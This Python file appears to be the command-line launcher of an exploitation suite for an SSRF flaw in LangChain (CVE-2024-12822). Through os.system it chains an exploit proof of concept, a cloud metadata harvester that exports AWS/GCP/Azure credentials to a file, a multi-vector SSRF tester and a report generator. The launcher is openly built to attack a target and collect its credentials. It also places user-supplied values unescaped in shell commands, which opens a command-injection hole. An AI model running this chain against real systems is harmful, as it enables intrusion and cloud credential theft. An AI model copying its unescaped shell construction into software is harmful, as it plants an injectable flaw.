#!/usr/bin/env python3
"""
CVE-2024-12822 Exploitation Suite - All-in-One Tool

Unified interface for all LangChain SSRF exploitation tools.

Author: Tsunami Community
License: Apache 2.0
"""

import argparse
import sys
import os
from colorama import Fore, Style, init

init(autoreset=True)


BANNER = f"""
{Fore.CYAN}╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║   🔥 CVE-2024-12822 Exploitation Suite 🔥                     ║
║   LangChain SSRF - Complete Toolkit                          ║
║                                                               ║
║   [1] Interactive Exploit PoC                                ║
║   [2] Cloud Metadata Harvester                               ║
║   [3] Multi-Vector SSRF Tester                               ║
║   [4] HTML Report Generator                                  ║
║   [5] Full Automated Attack Chain                            ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""


def print_section(title):
    """Print section header."""
    print(f"\n{Fore.YELLOW}{'='*60}")
    print(f"{title}")
    print(f"{'='*60}{Style.RESET_ALL}\n")


def run_interactive_exploit(args):
    """Run interactive exploit PoC."""
    print_section("🎯 Interactive Exploit PoC")
    
    cmd = f"python3 exploit_poc.py -u {args.url}"
    if args.proxy:
        cmd += f" --proxy {args.proxy}"
    if args.auto:
        cmd += " --auto"
    
    print(f"{Fore.GREEN}Running: {cmd}{Style.RESET_ALL}\n")
    os.system(cmd)


def run_cloud_harvester(args):
    """Run cloud metadata harvester."""
    print_section("☁️  Cloud Metadata Harvester")
    
    if not args.endpoint:
        print(f"{Fore.RED}Error: --endpoint required for cloud harvester{Style.RESET_ALL}")
        return
    
    cmd = f"python3 cloud_harvester.py -u {args.url} -e {args.endpoint}"
    if args.output:
        cmd += f" -o {args.output}"
    cmd += " --export-creds"
    
    print(f"{Fore.GREEN}Running: {cmd}{Style.RESET_ALL}\n")
    os.system(cmd)


def run_multi_vector(args):
    """Run multi-vector tester."""
    print_section("🔬 Multi-Vector SSRF Tester")
    
    if not args.endpoint:
        print(f"{Fore.RED}Error: --endpoint required for multi-vector tester{Style.RESET_ALL}")
        return
    
    cmd = f"python3 multi_vector_tester.py -u {args.url} -e {args.endpoint}"
    if args.dns_callback:
        cmd += f" --dns-callback {args.dns_callback}"
    
    print(f"{Fore.GREEN}Running: {cmd}{Style.RESET_ALL}\n")
    os.system(cmd)


def run_report_generator(args):
    """Run report generator."""
    print_section("📊 HTML Report Generator")
    
    cmd = f"python3 report_generator.py -u {args.url}"
    if args.output:
        cmd += f" -o {args.output}"
    else:
        cmd += " -o ssrf_report.html"
    
    if args.json_input:
        cmd += f" -j {args.json_input}"
    
    cmd += " -s CRITICAL"
    
    print(f"{Fore.GREEN}Running: {cmd}{Style.RESET_ALL}\n")
    os.system(cmd)


def run_full_attack_chain(args):
    """Run complete automated attack chain."""
    print(f"\n{Fore.RED}{'='*60}")
    print(f"🚀 FULL AUTOMATED ATTACK CHAIN")
    print(f"{'='*60}{Style.RESET_ALL}\n")
    
    print(f"{Fore.YELLOW}Target: {args.url}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}This will perform:{Style.RESET_ALL}")
    print("  1. Interactive endpoint discovery")
    print("  2. Cloud metadata harvesting (AWS/GCP/Azure)")
    print("  3. Multi-vector SSRF testing")
    print("  4. Professional HTML report generation\n")
    
    input(f"{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
    
    # Step 1: Interactive discovery
    print_section("Step 1/4: Endpoint Discovery")
    print(f"{Fore.YELLOW}Running interactive exploit for endpoint discovery...{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Please run discovery (option 1) and note the endpoint.{Style.RESET_ALL}\n")
    
    os.system(f"python3 exploit_poc.py -u {args.url}")
    
    # Get endpoint from user
    endpoint = input(f"\n{Fore.CYAN}Enter discovered endpoint (e.g., /api/load): {Style.RESET_ALL}").strip()
    
    if not endpoint:
        print(f"{Fore.RED}No endpoint provided. Aborting.{Style.RESET_ALL}")
        return
    
    # Step 2: Cloud harvesting
    print_section("Step 2/4: Cloud Metadata Harvesting")
    os.system(f"python3 cloud_harvester.py -u {args.url} -e {endpoint} -o findings.json --export-creds")
    
    # Step 3: Multi-vector testing
    print_section("Step 3/4: Multi-Vector SSRF Testing")
    os.system(f"python3 multi_vector_tester.py -u {args.url} -e {endpoint}")
    
    # Step 4: Report generation
    print_section("Step 4/4: Report Generation")
    os.system(f"python3 report_generator.py -u {args.url} -j findings.json -s CRITICAL -o final_report.html")
    
    # Summary
    print_section("✅ ATTACK CHAIN COMPLETE")
    print(f"{Fore.GREEN}[+] Findings exported to: findings.json{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[+] Credentials exported to: harvested_credentials.txt{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[+] HTML report generated: final_report.html{Style.RESET_ALL}")
    print(f"\n{Fore.CYAN}Open final_report.html in your browser to view the complete assessment.{Style.RESET_ALL}\n")


def main():
    """Main entry point."""
    print(BANNER)
    
    parser = argparse.ArgumentParser(
        description="CVE-2024-12822 Exploitation Suite - All-in-One Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Interactive menu
  %(prog)s
  
  # Run specific tool
  %(prog)s -u http://target.com --tool exploit
  %(prog)s -u http://target.com -e /api/load --tool harvest
  %(prog)s -u http://target.com -e /api/load --tool multivector
  %(prog)s -u http://target.com --tool report
  
  # Full automated attack chain
  %(prog)s -u http://target.com --full-auto
        """
    )
    
    parser.add_argument('-u', '--url', help='Target URL')
    parser.add_argument('-e', '--endpoint', help='Vulnerable endpoint (e.g., /api/load)')
    parser.add_argument('--tool', choices=['exploit', 'harvest', 'multivector', 'report'],
                       help='Specific tool to run')
    parser.add_argument('--full-auto', action='store_true', help='Run full automated attack chain')
    parser.add_argument('-o', '--output', help='Output file')
    parser.add_argument('-j', '--json-input', help='Input JSON file')
    parser.add_argument('--proxy', help='HTTP proxy')
    parser.add_argument('--dns-callback', help='DNS callback domain')
    parser.add_argument('--auto', action='store_true', help='Auto mode for exploit')
    
    args = parser.parse_args()
    
    # Interactive mode if no URL provided
    if not args.url:
        print(f"{Fore.YELLOW}Select a tool to run:{Style.RESET_ALL}\n")
        print("1. Interactive Exploit PoC")
        print("2. Cloud Metadata Harvester")
        print("3. Multi-Vector SSRF Tester")
        print("4. HTML Report Generator")
        print("5. Full Automated Attack Chain")
        print("6. Exit\n")
        
        choice = input(f"{Fore.CYAN}Enter choice [1-6]: {Style.RESET_ALL}").strip()
        
        if choice == '6':
            print(f"\n{Fore.GREEN}Goodbye!{Style.RESET_ALL}\n")
            return
        
        # Get URL
        url = input(f"{Fore.CYAN}Enter target URL: {Style.RESET_ALL}").strip()
        args.url = url
        
        if choice == '1':
            args.tool = 'exploit'
        elif choice == '2':
            args.tool = 'harvest'
            args.endpoint = input(f"{Fore.CYAN}Enter endpoint: {Style.RESET_ALL}").strip()
        elif choice == '3':
            args.tool = 'multivector'
            args.endpoint = input(f"{Fore.CYAN}Enter endpoint: {Style.RESET_ALL}").strip()
        elif choice == '4':
            args.tool = 'report'
        elif choice == '5':
            args.full_auto = True
    
    # Run selected tool
    if args.full_auto:
        run_full_attack_chain(args)
    elif args.tool == 'exploit':
        run_interactive_exploit(args)
    elif args.tool == 'harvest':
        run_cloud_harvester(args)
    elif args.tool == 'multivector':
        run_multi_vector(args)
    elif args.tool == 'report':
        run_report_generator(args)
    else:
        print(f"{Fore.RED}No tool selected. Use --tool or --full-auto{Style.RESET_ALL}")
        parser.print_help()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}[!] Interrupted by user{Style.RESET_ALL}\n")
        sys.exit(0)
